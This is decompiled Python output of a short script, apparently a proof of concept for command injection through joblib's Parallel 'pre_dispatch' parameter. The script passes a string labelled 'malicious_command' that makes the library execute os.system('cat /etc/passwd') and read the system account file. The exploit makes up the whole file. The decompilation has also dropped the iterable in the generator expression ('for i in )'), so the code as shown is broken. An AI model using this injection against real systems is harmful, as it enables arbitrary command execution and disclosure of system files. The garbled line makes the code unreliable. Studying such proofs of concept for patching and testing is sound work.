# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 373_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 407 bytes
import os
from joblib import Parallel, delayed

def f(x):
    return x * x


malicious_command = "os.system('cat /etc/passwd')"
p = Parallel(n_jobs=2, pre_dispatch=malicious_command)
results = p((delayed(f)(i) for i in ))
print(results)

# okay decompiling 373_1.pyc
